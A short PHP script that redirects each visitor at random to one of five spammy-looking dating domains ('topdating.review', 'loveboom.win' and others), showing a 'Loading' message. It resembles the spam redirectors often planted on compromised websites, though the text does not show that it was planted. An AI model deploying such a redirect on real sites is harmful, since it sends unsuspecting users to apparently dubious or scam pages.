<?php
$urls = array("topdating.review",
              "findlocallove.date",
              "meetandflirt.party",
              "singlesnserch.date",
              "loveboom.win");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

